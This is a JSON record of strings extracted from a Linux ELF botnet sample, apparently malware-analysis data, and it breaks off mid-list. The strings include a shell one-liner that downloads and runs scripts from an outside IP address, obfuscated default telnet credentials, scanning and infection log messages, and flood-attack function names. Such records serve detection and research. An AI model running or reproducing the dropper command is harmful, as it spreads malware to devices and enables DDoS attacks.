{
    "malware_data": [
        {
            "filename": "f747d6c7d375568d3b4936ffb0938445ba3da2b138d059d717c8a5cbc97e6cdc.elf",
            "filetype": "7F454C46",
            "filesize": "90KB",
            "hash_sha256": "f747d6c7d375568d3b4936ffb0938445ba3da2b138d059d717c8a5cbc97e6cdc",
            "strings": [
                "PTRh",
                "QVhd",
                "<suM",
                "<duJ",
                "<xuJ",
                "<XuJ",
                "<uuG",
                "<cuT",
                "L[^_]",
                "[^_]",
                "p^_]",
                "Y[_]",
                "PRQW",
                "T$(S",
                "QQVj",
                "t$(j",
                "UWVS",
                "|$4h",
                "t29{",
                "D$$PV",
                " [^_",
                "<wt#<r",
                "D$8P",
                "QQSP",
                "D$(P",
                "t$Ph",
                "t$(V",
                "QPRS",
                "t$$S",
                "T$`~",
                "L$,1",
                "D$(%",
                "WVPR",
                "$VRP",
                "?0u,",
                "VVhB",
                "D$ P",
                "PRQQ",
                "tR~P",
                "tB~@=",
                "<$u0",
                "\\$L9",
                "<mtN",
                ":*u4",
                "L$pE",
                "D$`P",
                "T$\\)",
                "\\[^_]",
                "D$gP",
                "Z[^_]",
                "\\$HPh",
                "D$)P",
                "D$$Ph",
                "t$xSU",
                "t$xj",
                "t$hW",
                "\\$DS",
                "T$@XZ",
                "D$TPhH",
                "E$RWP",
                "uZRj",
                "t$,U",
                "D$ Pj",
                "xAPPSh@",
                "\\$Th0",
                "T$ ~",
                "#t$ ",
                "2#D$ ",
                "u=9J",
                ";X,tQ",
                "u<9J",
                "SSPQ)",
                "uXRh",
                "\\$ S",
                "D$,Phx",
                "XZhx",
                "G;<$|",
                "XZKy",
                "D$ [Xj",
                "}/QQ",
                "uJQQj",
                "t$@h",
                "D$4j",
                "ET$,",
                " <xu",
                "(<`v",
                "}/C9",
                "D$, D$",
                "t$$h ",
                "u%WWSS",
                "ZYSS",
                "yPPj",
                "PPSh`t",
                "t@;D$xu",
                "t$Dj",
                "D$<PR",
                "^8QSh",
                ")\\$(",
                "<rt><w",
                "t7<af",
                "E4tmPh",
                "wcQWUR",
                "u'z%",
                "u?z=",
                "D$Pp",
                "l$61",
                "D$(RP",
                "D$'g",
                "D$'f",
                "\\$'t",
                "D$\\p",
                "|$d|4",
                "|$'ftt",
                "T$H~@",
                "Z %0",
                "^8PSh",
                "QQWS",
                "'RRWS",
                ".u5A",
                "D$7h",
                "T$8XZj",
                "\\$PS",
                "D$$;",
                "}3Ph",
                "D$$f",
                "D$LPU",
                "D$89",
                "uOQhH",
                "XZKj",
                "9\\$$}",
                "PCPVU",
                ";\\$d|",
                "D$tP",
                "T$|RW",
                "G$;G wn",
                "9D$xu,",
                "t$4C;\\$h}",
                "T$<^_",
                "uDQhH",
                "D$(@",
                "T$(u",
                "tMQh",
                "T$8f",
                "t>QQh",
                "\\$$S",
                "t$4j",
                "t$8j",
                "T$$v",
                "D$(PV",
                "x:RW",
                "PVWS",
                "t+F1",
                "D$ PU",
                "yQGQVh",
                "u+Rj",
                "D$$P",
                ",[^_]",
                "UWV1",
                "D$+1",
                "|<+0u&",
                "D<+t)",
                "|$7W",
                "<[^_]",
                "Pj j",
                "D$HP",
                ";D$|v",
                "!WWR",
                "D$0t ",
                "PPj#",
                "u,PP",
                "t$4U",
                "UWVS1",
                "YRRj.W",
                "D$()",
                "G;|$,",
                "s^PS",
                "45.90.217.165:23",
                "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh",
                "roo34555345",
                "ad34334in",
                "us534534534er",
                "lo54345534gin",
                "ge534345345st",
                "sp345345port",
                "ro34534534ot",
                "a5345345d55345",
                "us534534534534er",
                "lo345345345gin",
                "345345345",
                "su34534rt",
                "/tmp/*",
                "/var/*",
                "/var/run/*",
                "/var/tmp/*",
                "/dev/netslink/*",
                "/dev/*",
                "/dev/shm/*",
                "/usr/*",
                "/opt/*",
                "mdm9625",
                "9615-cdp",
                "F600",
                "F660",
                "F609",
                "user",
                "ogin",
                "name",
                "pass",
                "dvrdvs",
                "nter",
                "User",
                "welcome",
                "nvalid",
                "ailed",
                "ncorrect",
                "enied",
                "rror",
                "oodbye",
                "ailure",
                "exit",
                "busybox",
                "shell",
                "version",
                "system",
                "command",
                "help",
                "x86_32",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
                "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
                "TheSuBot/0.2 (www.thesubot.de)",
                "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
                "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
                "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
                "zspider/0.9-dev http://feedback.redkolibri.com/",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
                "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
                "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
                "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
                "Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
                "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
                "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
                "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
                "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
                "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
                "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
                "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
                "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
                "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
                "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01",
                "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
                "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
                "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
                "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
                "(null)",
                ":>%$#",
                "%d.%d.%d.%d",
                "[ Yakuza ] Result || IP: %s || Port: 23 || Username: %s || Password: %s",
                "[ Yakuza ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s",
                "connected",
                "LINKED",
                "[ Yakuza ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s",
                "[ Yakuza ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s",
                "d4mQasDSH6",
                "%s %s HTTP/1.1",
                "Host: %s",
                "User-Agent: %s",
                "Connection: close",
                "wget --no-check-certificate -q -O /tmp/null ",
                "ICMP",
                "TELNET",
                "FLOAD",
                "FLoad Mode Activated",
                "HTTP",
                "WGET",
                "STOP",
                "/etc/resolv.conf",
                "nameserver 8.8.8.8",
                "nameserver 8.8.4.4",
                "BIG_ENDIAN",
                "LITTLE_ENDIAN",
                "BIG_ENDIAN_W",
                "LITTLE_ENDIAN_W",
                "UNKNOWN",
                "[96mBOT JOINED",
                "[97m] Arch: ",
                "[96m%s ",
                "[97m|| Type: %s]",
                "/bin/sh",
                "(nil)",
                "hlLjztqZ",
                "npxXoudifFeEgGaACScs",
                " +0-#'I",
                "Unknown error ",
                "Success",
                "Operation not permitted",
                "No such file or directory",
                "No such process",
                "Interrupted system call",
                "Input/output error",
                "No such device or address",
                "Argument list too long",
                "Exec format error",
                "Bad file descriptor",
                "No child processes",
                "Resource temporarily unavailable",
                "Cannot allocate memory",
                "Permission denied",
                "Bad address",
                "Block device required",
                "Device or resource busy",
                "File exists",
                "Invalid cross-device link",
                "No such device",
                "Not a directory",
                "Is a directory",
                "Invalid argument",
                "Too many open files in system",
                "Too many open files",
                "Inappropriate ioctl for device",
                "Text file busy",
                "File too large",
                "No space left on device",
                "Illegal seek",
                "Read-only file system",
                "Too many links",
                "Broken pipe",
                "Numerical argument out of domain",
                "Numerical result out of range",
                "Resource deadlock avoided",
                "File name too long",
                "No locks available",
                "Function not implemented",
                "Directory not empty",
                "Too many levels of symbolic links",
                "No message of desired type",
                "Identifier removed",
                "Channel number out of range",
                "Level 2 not synchronized",
                "Level 3 halted",
                "Level 3 reset",
                "Link number out of range",
                "Protocol driver not attached",
                "No CSI structure available",
                "Level 2 halted",
                "Invalid exchange",
                "Invalid request descriptor",
                "Exchange full",
                "No anode",
                "Invalid request code",
                "Invalid slot",
                "Bad font file format",
                "Device not a stream",
                "No data available",
                "Timer expired",
                "Out of streams resources",
                "Machine is not on the network",
                "Package not installed",
                "Object is remote",
                "Link has been severed",
                "Advertise error",
                "Srmount error",
                "Communication error on send",
                "Protocol error",
                "Multihop attempted",
                "RFS specific error",
                "Bad message",
                "Value too large for defined data type",
                "Name not unique on network",
                "File descriptor in bad state",
                "Remote address changed",
                "Can not access a needed shared library",
                "Accessing a corrupted shared library",
                ".lib section in a.out corrupted",
                "Attempting to link in too many shared libraries",
                "Cannot exec a shared library directly",
                "Invalid or incomplete multibyte or wide character",
                "Interrupted system call should be restarted",
                "Streams pipe error",
                "Too many users",
                "Socket operation on non-socket",
                "Destination address required",
                "Message too long",
                "Protocol wrong type for socket",
                "Protocol not available",
                "Protocol not supported",
                "Socket type not supported",
                "Operation not supported",
                "Protocol family not supported",
                "Address family not supported by protocol",
                "Address already in use",
                "Cannot assign requested address",
                "Network is down",
                "Network is unreachable",
                "Network dropped connection on reset",
                "Software caused connection abort",
                "Connection reset by peer",
                "No buffer space available",
                "Transport endpoint is already connected",
                "Transport endpoint is not connected",
                "Cannot send after transport endpoint shutdown",
                "Too many references: cannot splice",
                "Connection timed out",
                "Connection refused",
                "Host is down",
                "No route to host",
                "Operation already in progress",
                "Operation now in progress",
                "Stale NFS file handle",
                "Structure needs cleaning",
                "Not a XENIX named type file",
                "No XENIX semaphores available",
                "Is a named type file",
                "Remote I/O error",
                "Disk quota exceeded",
                "No medium found",
                "Wrong medium type",
                "/dev/null",
                "L(knN",
                " Ainf",
                "/etc/config/resolv.conf",
                "nameserver",
                "domain",
                "search",
                "0123456789abcdef",
                "/etc/hosts",
                "/etc/config/hosts",
                "CAk[S",
                "GCC: (GNU) 4.1.2",
                ".symtab",
                ".strtab",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".eh_frame",
                ".ctors",
                ".dtors",
                ".jcr",
                ".got.plt",
                ".data",
                ".bss",
                ".comment",
                "libc/sysdeps/linux/i386/crti.S",
                "crtstuff.c",
                "__CTOR_LIST__",
                "__DTOR_LIST__",
                "__EH_FRAME_BEGIN__",
                "__JCR_LIST__",
                "completed.2429",
                "p.2427",
                "__do_global_dtors_aux",
                "object.2482",
                "frame_dummy",
                "__CTOR_END__",
                "__DTOR_END__",
                "__FRAME_END__",
                "__JCR_END__",
                "__do_global_ctors_aux",
                "initfini.c",
                "libc/sysdeps/linux/i386/crtn.S",
                "libc/sysdeps/linux/i386/crt1.S",
                "client.c",
                "i.4393",
                "printchar",
                "prints",
                "printi",
                "print",
                "ipState.5143",
                "ipState.5245",
                "__syscall_fcntl.c",
                "__syscall_fcntl64.c",
                "_exit.c",
                "access.c",
                "chdir.c",
                "close.c",
                "fork.c",
                "getdtablesize.c",
                "getpid.c",
                "getppid.c",
                "getrlimit.c",
                "kill.c",
                "open.c",
                "prctl.c",
                "read.c",
                "select.c",
                "seteuid.c",
                "setresuid.c",
                "setreuid.c",
                "setuid.c",
                "time.c",
                "waitpid.c",
                "write.c",
                "isspace.c",
                "toupper.c",
                "__C_ctype_b.c",
                "__C_ctype_toupper.c",
                "__errno_location.c",
                "sprintf.c",
                "vsnprintf.c",
                "popen.c",
                "mylock",
                "popen_list",
                "_stdio.c",
                "_stdio_streams",
                "__stdio_mutex_initializer.4160",
                "_fixed_buffers",
                "_wcommit.c",
                "_vfprintf_internal.c",
                "_charpad",
                "_fp_out_narrow",
                "spec_base.4370",
                "prefix.4371",
                "_ppfs_init.c",
                "_ppfs_prepargs.c",
                "_ppfs_setargs.c",
                "_ppfs_parsespec.c",
                "_promoted_size",
                "type_codes",
                "type_sizes",
                "spec_flags.4372",
                "qual_chars.4377",
                "spec_chars.4373",
                "spec_ranges.4374",
                "spec_or_mask.4375",
                "spec_and_mask.4376",
                "fputs_unlocked.c",
                "fwrite_unlocked.c",
                "memcpy.c",
                "memset.c",
                "strcat.c",
                "strchr.c",
                "strcpy.c",
                "strlen.c",
                "strncpy.c",
                "strnlen.c",
                "strstr.c",
                "__glibc_strerror_r.c",
                "__xpg_strerror_r.c",
                "unknown.1330",
                "_string_syserrmsgs.c",
                "bcopy.c",
                "strcasestr.c",
                "strtok.c",
                "next_start.1278",
                "isatty.c",
                "tcgetattr.c",
                "ntohl.c",
                "inet_ntoa.c",
                "buf.2827",
                "inet_makeaddr.c",
                "gethostbyname.c",
                "buf.5162",
                "h.5161",
                "gethostbyname_r.c",
                "connect.c",
                "getsockopt.c",
                "recv.c",
                "send.c",
                "sendto.c",
                "setsockopt.c",
                "socket.c",
                "signal.c",
                "sigsetops.c",
                "malloc.c",
                "__malloc_largebin_index",
                "free.c",
                "__malloc_trim",
                "abort.c",
                "been_there_done_that",
                "rand.c",
                "random.c",
                "unsafe_state",
                "randtbl",
                "random_r.c",
                "random_poly_info",
                "system.c",
                "atol.c",
                "strtol.c",
                "_stdlib_strto_l.c",
                "exit.c",
                "execl.c",
                "sleep.c",
                "sysconf.c",
                "__uClibc_main.c",
                "__pthread_return_0",
                "__pthread_return_void",
                "__check_one_fd",
                "been_there_done_that.3001",
                "sigaction.c",
                "__restore_rt",
                "__restore",
                "libc/sysdeps/linux/i386/vfork.S",
                "libc/sysdeps/linux/i386/mmap.S",
                "__socketcall.c",
                "__syscall_rt_sigaction.c",
                "clock_getres.c",
                "dup2.c",
                "execve.c",
                "getegid.c",
                "geteuid.c",
                "getgid.c",
                "getpagesize.c",
                "getuid.c",
                "ioctl.c",
                "munmap.c",
                "nanosleep.c",
                "pipe.c",
                "sbrk.c",
                "sigprocmask.c",
                "wait4.c",
                "__C_ctype_tolower.c",
                "errno.c",
                "__h_errno_location.c",
                "wcrtomb.c",
                "wcsrtombs.c",
                "wcsnrtombs.c",
                "fclose.c",
                "fdopen.c",
                "_WRITE.c",
                "_fopen.c",
                "_fwrite.c",
                "_trans2w.c",
                "_load_inttype.c",
                "_store_inttype.c",
                "_uintmaxtostr.c",
                "_fpmaxtostr.c",
                "exp10_table",
                "fflush_unlocked.c",
                "memchr.c",
                "memmove.c",
                "mempcpy.c",
                "memrchr.c",
                "strtok_r.c",
                "strpbrk.c",
                "inet_aton.c",
                "dnslookup.c",
                "static_ns",
                "static_id",
                "opennameservers.c",
                "get_hosts_byname_r.c",
                "raise.c",
                "dl-support.c",
                "brk.c",
                "__syscall_error.c",
                "poll.c",
                "fopen.c",
                "fseeko.c",
                "fseeko64.c",
                "_adjust_pos.c",
                "_cs_funcs.c",
                "fgets.c",
                "fgets_unlocked.c",
                "strcmp.c",
                "strncat.c",
                "rawmemchr.c",
                "strspn.c",
                "strdup.c",
                "ntop.c",
                "inet_pton4",
                "xdigits.3285",
                "inet_ntop4",
                "encodeh.c",
                "decodeh.c",
                "encodeq.c",
                "lengthq.c",
                "decodea.c",
                "read_etc_hosts_r.c",
                "llseek.c",
                "tolower.c",
                "fgetc_unlocked.c",
                "strcasecmp.c",
                "encoded.c",
                "decoded.c",
                "lengthd.c",
                "_READ.c",
                "_rfill.c",
                "_trans2r.c",
                "__fini_array_end",
                "__fini_array_start",
                "__init_array_end",
                "__preinit_array_end",
                "_GLOBAL_OFFSET_TABLE_",
                "__init_array_start",
                "__preinit_array_start",
                "__read_etc_hosts_r",
                "UpdateNameSrvs",
                "__GI_execve",
                "__libc_sigaction",
                "strcpy",
                "__GI_fcntl64",
                "recvLine",
                "__socketcall",
                "__GI___ctype_b",
                "__GI_memchr",
                "__GI___glibc_strerror_r",
                "waitpid",
                "__open_nameservers",
                "__GI_fopen",
                "getrlimit",
                "ioctl",
                "_stdio_openlist_use_count",
                "__GI_initstate_r",
                "__GI_sigaction",
                "strtok_r",
                "__GI___C_ctype_toupper_data",
                "__GI_time",
                "getgid",
                "popen",
                "sysconf",
                "stdout",
                "random",
                "__GI_strdup",
                "__GI_getpagesize",
                "getdtablesize",
                "__GI_h_errno",
                "contains_fail",
                "__length_question",
                "__GI___ctype_toupper",
                "__GI_strcasecmp",
                "advance_telstate",
                "__GI_tolower",
                "recv",
                "connect",
                "__encode_question",
                "__GI___uClibc_fini",
                "numpids",
                "__encode_header",
                "__GI_strncat",
                "__pthread_mutex_lock",
                "initConnection",
                "__sigdelset",
                "__GI_clock_getres",
                "SendWGET",
                "__uClibc_fini",
                "memrchr",
                "geteuid",
                "inet_pton",
                "__GI_vsnprintf",
                "memmove",
                "pclose",
                "__bsd_signal",
                "__GI_strpbrk",
                "__stdio_trans2r_o",
                "munmap",
                "__GI_setsockopt",
                "__libc_stack_end",
                "__GI_fclose",
                "__GI_wcsnrtombs",
                "__GI_pipe",
                "_uintmaxtostr",
                "__libc_fcntl",
                "atol",
                "_h_errno",
                "getRandomPublicIP",
                "getc_unlocked",
                "__ctype_b",
                "__GI_random_r",
                "errno",
                "getegid",
                "read_until_response",
                "__GI_sbrk",
                "zprintf",
                "__GI___uClibc_init",
                "execve",
                "getpagesize",
                "getpid",
                "TelnetIPRanges",
                "__GI_lseek64",
                "setstate_r",
                "fgets",
                "getHost",
                "__libc_getpid",
                "wildString",
                "__xpg_strerror_r",
                "SendUDP",
                "fcntl64",
                "prctl",
                "memcpy",
                "TelnetScanner",
                "makeRandomStr",
                "getRandomIP",
                "__GI_fputs_unlocked",
                "execl",
                "__GI_fgets",
                "creat",
                "_stdio_openlist_dec_use",
                "sclose",
                "__libc_select",
                "_ppfs_init",
                "__GI___C_ctype_toupper",
                "__GI_fgetc_unlocked",
                "__libc_nanosleep",
                "trim",
                "__GI_fgets_unlocked",
                "dup2",
                "__pthread_mutex_init",
                "tolower",
                "getuid",
                "__open_etc_hosts",
                "malloc",
                "isatty",
                "sleep",
                "__GI_atol",
                "vsnprintf",
                "__dns_lookup",
                "__GI_read",
                "__C_ctype_tolower",
                "random_r",
                "__dso_handle",
                "clock_getres",
                "gethostbyname_r",
                "tcpcsum",
                "reset_telstate",
                "socket",
                "__GI_dup2",
                "select",
                "_pthread_cleanup_pop_restore",
                "__GI_wcrtomb",
                "__GI___libc_fcntl",
                "__GI_memset",
                "isspace",
                "__stdio_seek",
                "mempcpy",
                "__GI_strcoll",
                "__GI_write",
                "__ctype_toupper",
                "__libc_read",
                "_string_syserrmsgs",
                "__GI_open",
                "__GI_strchr",
                "__searchdomain",
                "__GI_tcgetattr",
                "__environ",
                "mmap",
                "wcsnrtombs",
                "makeIPPacket",
                "sockprintf",
                "__GI_inet_ntoa",
                "send",
                "__fgetc_unlocked",
                "abort",
                "__GI_fcntl",
                "__GI_wcsrtombs",
                "__GI_fwrite_unlocked",
                "SendSTD",
                "__GI_getgid",
                "srandom_r",
                "_init",
                "__GI_inet_ntoa_r",
                "__GI_setstate_r",
                "strtol",
                "pipe",
                "__libc_lseek64",
                "strnlen",
                "rawmemchr",
                "__GI_mempcpy",
                "__malloc_state",
                "__GI___C_ctype_b_data",
                "uagents",
                "__sigaddset",
                "nanosleep",
                "__GI_send",
                "h_errno",
                "__pthread_mutex_unlock",
                "wait4",
                "__register_frame_info_bases",
                "__GI_exit",
                "__app_fini",
                "csum",
                "__exit_cleanup",
                "__GI_execl",
                "__GI_srandom_r",
                "__GI___ctype_tolower",
                "write",
                "environ",
                "__GI_close",
                "getBuild",
                "__resolv_lock",
                "kill",
                "fputs_unlocked",
                "__pthread_mutex_trylock",
                "strcat",
                "tel_usernames",
                "__GI_brk",
                "__GI_strcat",
                "__GI_nanosleep",
                "__GI_strtok",
                "_stdio_openlist",
                "__GI_sigprocmask",
                "inet_addr",
                "ntohl",
                "__GI_fseek",
                "__GI_setreuid",
                "ourIP",
                "chdir",
                "fseeko",
                "_stdio_openlist_del_count",
                "connectTimeout",
                "__raise",
                "setsockopt",
                "bsd_signal",
                "fseek",
                "__GI_kill",
                "__GI_strcmp",
                "__GI_memmove",
                "setstate",
                "__decode_dotted",
                "__stdio_READ",
                "memchr",
                "__GI_toupper",
                "__pthread_initialize_minimal",
                "__GI_recv",
                "__stdin",
                "stdin",
                "__GI_isatty",
                "strcasestr",
                "_start",
                "__deregister_frame_info_bases",
                "strstr",
                "__GI_ioctl",
                "init_rand",
                "rand",
                "signal",
                "read",
                "__decode_header",
                "__GI___h_errno_location",
                "__GI_memcpy",
                "strcoll",
                "wcsrtombs",
                "_stdio_user_locking",
                "strncpy",
                "strcasecmp",
                "htonl",
                "sendto",
                "__C_ctype_toupper",
                "__GI___C_ctype_b",
                "tel_passwords",
                "__GI_gethostbyname_r",
                "__GI_strncpy",
                "__libc_send",
                "__GI___xpg_strerror_r",
                "currentServer",
                "__GI___C_ctype_tolower",
                "__GI_getrlimit",
                "bcopy",
                "__GI_strcpy",
                "__GI_inet_ntop",
                "strtok",
                "getEndianness",
                "__stdio_adjust_position",
                "malloc_trim",
                "fdopen",
                "__GI_poll",
                "_vfprintf_internal",
                "__GI_strcasestr",
                "fork",
                "__stdio_rfill",
                "strncat",
                "setresuid",
                "__GI_sleep",
                "sigaction",
                "__GI_gethostbyname",
                "SendTCP",
                "_dl_phdr",
                "__GI_getc_unlocked",
                "__GI___libc_fcntl64",
                "__uClibc_init",
                "__GI_munmap",
                "_store_inttype",
                "__length_dotted",
                "__getpagesize",
                "__GI_random",
                "__syscall_error",
                "__uclibc_progname",
                "__GI_getegid",
                "__GI_wait4",
                "__malloc_lock",
                "__uClibc_main",
                "sbrk",
                "__rtld_fini",
                "__GI_fork",
                "strdup",
                "__libc_close",
                "__GI_getpid",
                "inet_aton",
                "index",
                "_pthread_cleanup_push_defer",
                "processCmd",
                "__sigismember",
                "fopen",
                "__bss_start",
                "setreuid",
                "__libc_open",
                "get_telstate_host",
                "memset",
                "__GI_socket",
                "main",
                "__glibc_strerror_r",
                "listFork",
                "__GI___C_ctype_tolower_data",
                "__stdio_fwrite",
                "negotiate",
                "srand",
                "initstate",
                "fclose",
                "__syscall_rt_sigaction",
                "ntohs",
                "inet_ntoa",
                "getppid",
                "tcgetattr",
                "__C_ctype_tolower_data",
                "time",
                "__libc_system",
                "__GI_abort",
                "poll",
                "seteuid",
                "__get_hosts_byname_r",
                "__stdio_init_mutex",
                "__GI__exit",
                "strcmp",
                "advances2",
                "__nameserver",
                "data_start",
                "__GI_sysconf",
                "__h_errno_location",
                "matchPrompt",
                "__C_ctype_b_data",
                "__GI_inet_pton",
                "gethostbyname",
                "_stdio_fopen",
                "_fini",
                "__GI_chdir",
                "__vfork",
                "__GI_mmap",
                "contains_success",
                "sprintf",
                "__get_pc_thunk_bx",
                "strerror_r",
                "__GI_select",
                "__libc_waitpid",
                "socket_connect",
                "__GI_waitpid",
                "_stdio_term",
                "__decode_answer",
                "__GI_signal",
                "stderr",
                "fails",
                "commServer",
                "vfork",
                "__C_ctype_b",
                "srandom",
                "_ppfs_setargs",
                "__GI_sendto",
                "__libc_fork",
                "__atexit_lock",
                "scanPid",
                "rand_cmwc",
                "tempdirs",
                "__GI_setresuid",
                "payload",
                "advances",
                "__libc_fcntl64",
                "getsockopt",
                "__GI_fseeko64",
                "fflush_unlocked",
                "__stdio_wcommit",
                "contains_string",
                "__GI___fgetc_unlocked",
                "__nameservers",
                "fwrite_unlocked",
                "inet_ntoa_r",
                "__pagesize",
                "_stdio_openlist_add_lock",
                "__GI_getdtablesize",
                "contains_response",
                "access",
                "_edata",
                "__stdout",
                "__GI_memrchr",
                "__GI_fflush_unlocked",
                "__GI_strstr",
                "__searchdomains",
                "_end",
                "htons",
                "_sigintr",
                "_ppfs_prepargs",
                "__GI_strspn",
                "fgetc_unlocked",
                "initstate_r",
                "__GI_connect",
                "__curbrk",
                "__libc_poll",
                "_dl_phnum",
                "_fpmaxtostr",
                "__errno_location",
                "_stdlib_strto_l",
                "__GI___libc_open",
                "__stdio_WRITE",
                "_stdio_init",
                "__GI_geteuid",
                "inet_ntop",
                "__C_ctype_toupper_data",
                "_dl_aux_init",
                "_errno",
                "atoi",
                "successes",
                "_stdio_openlist_del_lock",
                "__GI_inet_aton",
                "fgets_unlocked",
                "_exit",
                "szprintf",
                "strspn",
                "__libc_recv",
                "__libc_creat",
                "strlen",
